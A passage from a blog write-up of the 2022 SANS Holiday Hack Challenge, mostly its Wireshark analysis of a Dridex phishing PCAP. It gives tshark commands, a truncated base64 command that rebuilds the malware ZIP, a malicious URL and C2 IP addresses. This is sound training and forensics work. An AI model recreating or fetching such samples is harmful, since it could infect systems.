      if (e.key === 'ArrowDown' || keyCode === 40) {
        if (activeIndex === null) {
          activeIndex = 0;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === items.length - 1 ? 0 : activeIndex + 1;
        }
        items[activeIndex].classList.add('is-active');

        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel > 0) {
          document.querySelector(".search-content").scrollTop += items[activeIndex].getBoundingClientRect().height;
        } else if (activeIndex === 0) {
          document.querySelector(".search-content").scrollTop = 0;
        }
      } else if (e.key === 'ArrowUp' || keyCode === 38) {
        if (activeIndex === null) {
          activeIndex = items.length - 1;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === 0 ? items.length - 1 : activeIndex - 1;
        }
        items[activeIndex].classList.add('is-active');
        
        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel < 0) {
          document.querySelector(".search-content").scrollTop -= items[activeIndex].getBoundingClientRect().height;
        } else {
          document.querySelector(".search-content").scrollTop = overflowedPixel + items[activeIndex].getBoundingClientRect().height;
        }
      } else if (e.key === 'Enter' || keyCode === 13) {
        if (items[activeIndex] && items[activeIndex].getAttribute('href')) {
          location.href = items[activeIndex].getAttribute('href');
        }
      } else if (e.key === 'Escape' || keyCode === 27) {
        e.target.value = null;
        if (searchResults) {
          searchResults.classList.remove('is-active');
        }
      }
    }) : null;

    searchMobile ? 
    searchMobile.addEventListener('input', function(e) {
      if (!e.target.value) {
        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild);
        }
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      renderSearchResultsMobile(searchText, results);
      if (enableSearchHighlight) {
        renderSearchHighlightResultsMobile(searchText, results);
      } else {
        renderSearchResultsMobile(searchText, results);
      }
    }) : null;
  


  
    var mobileSearchInputElem = document.querySelector('#search-mobile');
    var mobileSearchClassElem = document.querySelector('.mobile-search');
    var mobileSearchBtnElems = document.querySelectorAll('.navbar-search');
    var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
    var mobileSearchContainer = document.querySelector('#search-mobile-container');
    var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
    var htmlElem = document.querySelector('html');

    if (mobileSearchClassElem) {
      mobileSearchClassElem.style.display = 'none';
    }

    mobileSearchBtnElems ? 
    mobileSearchBtnElems.forEach(function (elem, idx) {
      elem.addEventListener('click', function () {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'block';
        }

        if (mobileSearchInputElem) {
          mobileSearchInputElem.focus();
        }

        if (htmlElem) {
          htmlElem.style.overflowY = 'hidden';
        }
      });
    }) : null;

    mobileSearchCloseBtnElem ? 
    mobileSearchCloseBtnElem.addEventListener('click', function() {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'none';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.value = '';
      }
      
      if (mobileSearchResultsElem) {
        while (mobileSearchResultsElem.firstChild) {
          mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
        }
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'visible';
      }
    }) : null;

    mobileSearchInputElem ?
    mobileSearchInputElem.addEventListener('keydown', function(e) {
      var keyCode = e.which || e.keyCode;
      if (e.key === 'Escape' || keyCode === 27) {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'none';
        }
        
        if (mobileSearchInputElem) {
          mobileSearchInputElem.value = '';
        }

        if (mobileSearchResultsElem) {
          while (mobileSearchResultsElem.firstChild) {
            mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
          }
        }
        if (htmlElem) {
          htmlElem.style.overflowY = 'visible';
        }
      }
    }) : null;
  


  
    function renderSearchResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');
      
      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }

    function renderSearchHighlightResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');

      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeHighlightLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }
  
  });
</script>    
    


<link rel="stylesheet" href="/css/main.min.css">



  
  
    
    <link rel="stylesheet" href="/css/custom.min.css">
  

  
  
    
    <link rel="stylesheet" href="/css/font.min.css">
  

  
  
    
    <link rel="stylesheet" href="/scss/search.min.css">
  


    
<meta name="description" content="This year challenges were covering logs and PCAP analysis, CI/CD vulnerabilities, a container escape, webapp hacking (XXE, CSP bypass), an introduction to AWS CLI for cloud discovery and an introduction to smart contracts." />


<meta name="keywords" content="kringlecon,holidayhack">

<meta name="created" content="2023-01-07T00:00:00&#43;0000">
<meta name="modified" content="2023-01-07T00:00:00&#43;0000">
<meta property="article:published_time" content="2023-01-07T00:00:00&#43;0000">

<meta name="author" content="noobintheshell">
<meta property="article:author" content="https://noobintheshell.com/posts/kringlecon5/@noobintheshell">


<meta property="og:site_name" content="noobintheshell :: blog">
<meta property="og:title" content="KringleCon 5: Golden Rings">
<meta property="og:url" content="https://noobintheshell.com/posts/kringlecon5/">
<meta property="og:type" content="article">
<meta property="og:description" content="This year challenges were covering logs and PCAP analysis, CI/CD vulnerabilities, a container escape, webapp hacking (XXE, CSP bypass), an introduction to AWS CLI for cloud discovery and an introduction to smart contracts.">

  
    <meta property="og:image" content="https://noobintheshell.com/images/kringlecon5/header.webp">
    <meta property="og:image:url" content="https://noobintheshell.com/images/kringlecon5/header.webp">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:app:name:iphone" content="noobintheshell :: blog">
    <meta property="twitter:title" content="KringleCon 5: Golden Rings">
    <meta property="twitter:description" content="This year challenges were covering logs and PCAP analysis, CI/CD vulnerabilities, a container escape, webapp hacking (XXE, CSP bypass), an introduction to AWS CLI for cloud discovery and an introduction to smart contracts.">
  

<meta name="generator" content="Hugo 0.79.0" />
<meta name="msapplication-TileColor" content="#fff">

<meta name="theme-color" content="#fff">

<meta name="msapplication-navbutton-color" content="#fff">

<meta name="apple-mobile-web-app-status-bar-style" content="#fff">

<link rel="canonical" href="https://noobintheshell.com/posts/kringlecon5/">

<link rel="manifest" href="/manifest.json">

  
  <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/favicon.png" sizes="any" type="image/png" />
  


    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "headline": "KringleCon 5: Golden Rings",
    "datePublished": "2023-01-07T00:00:00Z",
    "dateModified": "2023-01-07T00:00:00Z",
    "url" : "https://noobintheshell.com/posts/kringlecon5/",
    "description": "This year challenges were covering logs and PCAP analysis, CI/CD vulnerabilities, a container escape, webapp hacking (XXE, CSP bypass), an introduction to AWS CLI for cloud discovery and an introduction to smart contracts.",
    "keywords": ["kringlecon","holidayhack"],
    "image" : "https://noobintheshell.com/images/kringlecon5/header.webp",
    "author": {
      "@type": "Person",
      "name": "noobintheshell"
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://noobintheshell.com"
    },
    "publisher": {
      "@type": "Organization",
      "name": "noobintheshell :: blog",
      "url": "https://noobintheshell.com"
    }
  }
</script>

    
  
  







    
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
<script src="https://unpkg.com/lunr/lunr.min.js"></script>


<script async src="https://www.googletagmanager.com/gtag/js?id=G-RVT4CS59SP"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-RVT4CS59SP');
</script>
</head>

<body id="root" class="theme__dark">
    <script>
        var localTheme = localStorage.getItem('theme');
        if (localTheme) {
            document.getElementById('root').className = 'theme__' + localTheme;
        }
    </script>
    <div id="container">
        





        <div class="wrapper" data-type="posts" data-kind="page">
            <nav class="navbar scrolling" role="navigation" aria-label="main navigation" data-dir="ltr">
  <div class="navbar__brand">
    
    &nbsp;&nbsp;
    
    
      <a href="/" title="Home" rel="home" class="navbar__title-link">
        <h6 class="navbar__title">#noobintheshell_</h6>
      </a>
    
  </div>

  
<div class="theme theme-mobile" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" style="position: absolute; top: 0;" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
      
    </div>
  </div>
</div>



<a role="button" class="navbar__burger" aria-label="menu" aria-expanded="false"
  data-ani="true">
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
</a>
<div class="navbarm__collapse" data-open="false">
  <ul dir="ltr">
    
    
      
      
      
      

      
        <li class="navbarm__menu--item active">
          <a href="/posts">Posts</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/archive">Archive</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/tags">Tags</a>
        </li>
      
      
    

    
      <li class="navbarm__menu--item ">
        <a href="/tags" class="navbarm__menu--term" data-index="0">
          Tags
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/categories" class="navbarm__menu--term" data-index="1">
          Categories
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/series" class="navbarm__menu--term" data-index="2">
          Series
        </a>
      </li>
    
  </ul>
</div>
  <div class="navbar__menu">
  
  
  
<div class="theme" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
      
    </div>
  </div>
</div>

  
  
  
  
  
  
  
  <a href="/posts" class="navbar__menu-item navbar__slide-down active" dir="ltr" data-ani="true">Posts</a>
  
  
  
  
  
  
  
  <a href="/archive" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Archive</a>
  
  
  
  
  
  
  
  <a href="/tags" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Tags</a>
  
  
  <div class="show-search">
    <a class="toggle-search" title="search posts">
        <svg xmlns="http://www.w3.org/2000/svg" width="34" height="35" viewBox="-100 100 800 680">
            <path
                d="M595.2 513.908L493.775 412.482c26.707-41.727 42.685-91.041 42.685-144.263C536.459 120.085 416.375 0 268.24 0 120.106 0 .021 120.085.021 268.219c0 148.134 120.085 268.22 268.219 268.22 53.222 0 102.537-15.979 144.225-42.686l101.426 101.463c22.454 22.453 58.854 22.453 81.271 0 22.492-22.491 22.492-58.855.038-81.308zm-326.96-54.103c-105.793 0-191.585-85.793-191.585-191.585 0-105.793 85.792-191.585 191.585-191.585s191.585 85.792 191.585 191.585c.001 105.792-85.791 191.585-191.585 191.585z" />
        </svg>
    </a>
</div>
<aside role="search">
        <div class="search-wrapper">
            <div class="close toggle-search">
                <svg height="512" width="512" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                    <path d="M443.6 387.1L312.4 255.4l131.5-130c5.4-5.4 5.4-14.2 0-19.6l-37.4-37.6c-2.6-2.6-6.1-4-9.8-4-3.7 0-7.2 1.5-9.8 4L256 197.8 124.9 68.3c-2.6-2.6-6.1-4-9.8-4-3.7 0-7.2 1.5-9.8 4L68 105.9c-5.4 5.4-5.4 14.2 0 19.6l131.5 130L68.4 387.1c-2.6 2.6-4.1 6.1-4.1 9.8 0 3.7 1.4 7.2 4.1 9.8l37.4 37.6c2.7 2.7 6.2 4.1 9.8 4.1 3.5 0 7.1-1.3 9.8-4.1L256 313.1l130.7 131.1c2.7 2.7 6.2 4.1 9.8 4.1 3.5 0 7.1-1.3 9.8-4.1l37.4-37.6c2.6-2.6 4.1-6.1 4.1-9.8-.1-3.6-1.6-7.1-4.2-9.7z"/></svg>
            </div>
            <form class="search_" method="get">
                <input type="search" placeholder="search..." disabled="disabled" />
            </form>

            <ul class="search-results">
                <li>
                </li>
            </ul> 
        </div>
</aside>

<script src="/js/search.min.e175b5801e0cbeca86c1e68a630de9556a6728307033f4efb8c956e9e1587cc1.js"></script>
</div>
</nav>
            
            

<main class="single__main main-main">
  
    <nav class="breadcrumb hide" aria-label="breadcrumbs">
  <script>document.querySelector('.breadcrumb').classList.remove('hide')</script>
  <ol>
    
  
  
  
  
  
  <li >
    
      <a href="https://noobintheshell.com/" class="capitalize">Home</a>
    
  </li>
  
  
  <li >
    
      <a href="https://noobintheshell.com/posts/" class="capitalize">Posts</a>
    
  </li>
  
  
  <li  class="is-active" >
    
      <span>KringleCon 5: Golden Rings</span>
    
  </li>
  
  </ol>
  
</nav>
  
  
  <div class="single ">
    <div class="single__nojs">This page looks best with JavaScript enabled</div>
    <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
    <h2 class="single__title" data-ani="true">KringleCon 5: Golden Rings</h2>
    <h3 class="single__subtitle">The 2022 SANS HolidayHack Challenge</h3>
    <div class="single__meta">
      
<div class="single__infos">
  <time class="single__info" title="Written At">📅 &nbsp;Jan 7, 2023 </time>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;42&nbsp;min read </span>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">🎅&nbsp;noobintheshell</span>
  
  <span class="single__info">
    
  </span>
</div>

      
<ul class="single__tags caption">
  
  🏷️
  

  <li><a href="https://noobintheshell.com/tags/kringlecon/" class="single__tag" title="kringlecon">#kringlecon</a></li>

  <li><a href="https://noobintheshell.com/tags/holidayhack/" class="single__tag" title="holidayhack">#holidayhack</a></li>

</ul>

    </div>
    <article class="single__contents" data-dir="ltr" data-ani="true">
      
      <h5 id="the-_sans-holiday-hack-challenge_-is-back-and-with-it-the-long-awaited-fifth-edition-of-_kringlecon_">The <em>SANS Holiday Hack Challenge</em> is back! And with it, the long awaited fifth edition of <em>KringleCon</em>!</h5>
<h6 id="this-year-challenges-were-covering-logs-and-pcap-analysis-cicd-vulnerabilities-a-container-escape-webapp-hacking-xxe-csp-bypass-an-introduction-to-aws-cli-for-cloud-discovery-and-an-introduction-to-smart-contracts">This year challenges were covering logs and PCAP analysis, CI/CD vulnerabilities, a container escape, webapp hacking (XXE, CSP bypass), an introduction to AWS CLI for cloud discovery and an introduction to smart contracts.</h6>
<h6 id="kringlecon-is-as-well-an-online-security-conference-and-you-can-find-all-the-talks-on-kringlecons-youtube-channelhttpswwwyoutubecomchannelucnir-c_vxv_tcfgww5vczag-the-same-discordhttpsdiscordggwbmx92rww3-channel-as-last-year-was-available-to-interact-with-the-community">KringleCon is as well an online security conference and you can find all the talks on <a href="https://www.youtube.com/channel/UCNiR-C_VXv_TCFgww5Vczag">KringleCon’s Youtube channel</a>. The same <a href="https://discord.gg/Wbmx92rWW3">Discord</a> channel as last year was available to interact with the community.</h6>
<h6 id="a-special-thanks-goes-to-the-whole-counter-hackhttpstwittercomcounterhackseclangen-team-for-their-constant-effort-to-make-this-available-to-the-community">A special thanks goes to the whole <a href="https://twitter.com/counterhacksec?lang=en">Counter Hack</a> team for their constant effort to make this available to the community!</h6>
<h2 id="objectives">Objectives</h2>
<p>Every year, we start with a pre-objective called <strong>KringleCon Orientation</strong> that helps us starting the journey to save the <em>Holiday Season</em> from villains! The main task here is to create a <em>KringleCoin</em> wallet. We will see in the last objective what this is and what will be its usage.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj00_01.webp" alt="KringleCoin wallet creation" data-caption="KringleCoin wallet creation" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      KringleCoin wallet creation
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="1---recover-the-tolkien-ring">1 - Recover the Tolkien Ring</h3>
<hr />
<h4 id="11-wireshark-practice">1.1 Wireshark Practice</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>1/5</td>
<td>Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysteries around the <a href="https://storage.googleapis.com/hhc22_player_assets/suspicious.pcap">suspicious PCAP</a>. Get hints for this challenge by typing <code>hint</code> in the upper panel of the terminal.</td>
<td>Tolkien Ring</td>
</tr>
</tbody>
</table>
<p>We are given a suspicious PCAP file to analyze and 7 questions to answer.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1. There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP?</div>
<p>In <em>Wireshark</em>, this can be seen in the menu <code>File -&gt; Export Objects -&gt; HTTP</code>. We can save the files to disk for further investigation.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_01.webp" alt="Wireshark - export *HTTP* objects" data-caption="Wireshark - export *HTTP* objects" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - export *HTTP* objects
      
        
        
      
    </figcaption>
  
</figure>
<p>We can export as well all <em>HTTP</em> files with <code>tshark</code>. For instance, to extract all <em>HTTP</em> files in the current folder, we can run:<br />
<div class="box">$ tshark -Q -r suspicious.pcap --export-object http,.</div></p>
<p>Answer: <code>HTTP</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2. What is the file name of the largest file we can export?</div>
<p>As we can see highlighted in the previous question, the biggest file is 808 kB big.</p>
<p>Answer: <code>app.php</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q3. What packet number starts that app.php file?</div>
<p>As we can see highlighted in question 1, the file is found in packet 687.</p>
<p>Answer: <code>687</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q4. What is the IP of the Apache server?</div>
<p>There are multiple ways to get the <em>IP</em> address. One of them is to look for the <em>DNS</em> queries for the webserver <code>adv.epostoday.uk</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_02.webp" alt="Wireshark - DNS query" data-caption="Wireshark - DNS query" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - DNS query
      
        
        
      
    </figcaption>
  
</figure>
<p>Or with <code>tshark</code>:</p>
<div class="box">$ tshark -r suspicious.pcap -Y &lsquo;dns.qry.name == &ldquo;adv.epostoday.uk&rdquo;&rsquo;</div>
<p>Answer: <code>192.185.57.242</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q5. What file is saved to the infected host?</div>
<p>If we download the <code>app.php</code> file we can see that in its source code. A base64 encoded bytestring is decoded and saved on disk as <code>Ref_Sept24-2020.zip</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_03.webp" alt="Wireshark - app.php" data-caption="Wireshark - app.php" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Wireshark - app.php
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>Ref_Sept24-2020.zip</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q6. Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea).</div>
<p>We can filter all <em>TLS</em> packets that have a country code and remove all the legitimate calls to <em>Microsoft</em> services with the following filter: <code>(x509sat.CountryName) &amp;&amp; (not x509sat.printableString contains &quot;Microsoft&quot;)</code>. We see 2 countries, Israel and South Sudan.</p>
<p>With <code>tshark</code>:</p>
<div class="box">$ tshark -r suspicious.pcap -Y &lsquo;(x509sat.CountryName) &amp;&amp; (not x509sat.printableString contains &ldquo;Microsoft&rdquo;)&rsquo; -T fields -e x509sat.CountryName | uniq<br />
IL,IL<br />
SS,SS</div>
<p>Answer: <code>Israel, South Sudan</code></p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q7. Is the host infected (Yes/No)?</div>
<p>The user has probably received a phishing email containing a malicious link to <a href="http://adv.epostoday.uk/app.php">http://adv.epostoday.uk/app.php</a>. Once clicked, the script downloads the file <code>Ref_Sept24-2020.zip</code>. We can recreate the <em>ZIP</em> file from the encoded payload in the <code>app.php</code> source code with the following commands:</p>
<div class="box">$ BYTES=&ldquo;UEsDBBQAAAAIAFCjN1FIq7H4ezsJAIN6CwATAAAAUmVmX1NlcHQyNC[&hellip;]&rdquo;<br />
$ echo $BYTES | base64 -D &gt; Ref_Sept24-2020.zip</div>
<p>The <em>ZIP</em> file contains a malicious <em>SCR</em> executable (do not execute it, it&rsquo;s a real malware). If we analyze the executable online, we see this is the <em>Dridex</em> installer. Once the user executed it, it started to communicate with the <em>C2</em> servers through <em>TLS</em>. The 2 malicious <em>IP</em> addresses are 62.98.109.30 (SS) and 151.236.219.181 (IL).</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon5/objectives/obj01_04.webp" alt="Unit42 - Dridex infection" data-caption="Unit42 - Dridex infection" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Unit42 - Dridex infection
      
        
        
      
    </figcaption>
  
</figure>
<p>Answer: <code>Yes</code></p>
<div class="alert alert-info" role="alert" data-dir="ltr">The <em>PCAP</em> file was taken from this repo: <a href="https://github.com/pan-unit42/wireshark-tutorial-Dridex-traffic">https://github.com/pan-unit42/wireshark-tutorial-Dridex-traffic</a> and goes with the companion blogpost of the <em>Unit42</em> team here: <a href="https://unit42.paloaltonetworks.com/wireshark-tutorial-dridex-infection-traffic/">https://unit42.paloaltonetworks.com/wireshark-tutorial-dridex-infection-traffic/</a></div>
<h4 id="12-windows-event-logs">1.2 Windows Event Logs</h4>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>2/5</td>
<td>Investigate the Windows <a href="https://storage.googleapis.com/hhc22_player_assets/powershell.evtx">event log</a> mystery in the terminal or offline. Get hints for this challenge by typing <code>hint</code> in the upper panel of the Windows Event Logs terminal.</td>
<td>Tolkien Ring</td>
</tr>
</tbody>
</table>
<p>We are given a <em>Powershell</em> event log to analyze this time. The description of the challenge mentions that a keylogger was downloaded to gather admin credentials and that <em>Powershell</em> was used to retrieve a secret recipe for <em>Lembanh</em>. We need to recover the secret ingredient that was stolen.</p>
<p>We can start by converting the <em>EVTX</em> file to <em>JSON</em> to parse it more easily. We can use <code>evtx_dump</code> from <a href="https://github.com/omerbenamram/evtx/">this repo</a> and convert it with:</p>
<div class="box">$ ./evtx_dump --dont-show-record-number -o json -f powershell.json powershell.evtx</div>
<p>We then have to answer to 10 questions.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1. What month/day/year did the attack take place?</div>
<p>Let&rsquo;s take the very first event of the logs to get the main attributes of a <em>Windows</em> event:</p>
<figure >
  
  
  
